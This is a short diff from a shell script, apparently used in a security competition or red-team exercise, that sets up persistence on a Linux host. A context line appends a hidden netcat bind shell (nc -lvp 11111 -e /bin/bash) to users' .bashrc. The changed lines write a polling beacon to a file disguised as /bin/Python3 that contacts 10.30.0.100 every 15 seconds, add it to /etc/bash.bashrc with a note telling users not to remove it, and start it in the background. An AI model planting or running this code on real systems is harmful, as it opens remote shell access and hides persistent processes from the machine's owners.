@@ -54,7 +54,7 @@ echo '(/usr/bin/nc -lvp 11111 -e /bin/bash &>/dev/null &) 2>&-' >> /home/*/.bash
 
 #Script to call scoreboard every 15 seconds 10.30.0.100
 #printf 'GET /351b HTTP/1.1\n\n' | nc localhost 80
-echo 'while 1: import urllib.request;import time;urllib.request.urlretrieve("http://localhost/351b");time.sleep(15)' > /bin/Python3
+echo 'while 1: import urllib.request;import time;urllib.request.urlretrieve("http://10.30.0.100/351b");time.sleep(15)' > /bin/Python3
 #This throws it into the main bashrc
 echo -e '#Dont remove if you want to be scored\n( bash -c 'exec python3 /bin/Python3' ) & disown' >> /etc/bash.bashrc
 ( bash -c 'exec python3 /bin/Python3' ) & disown
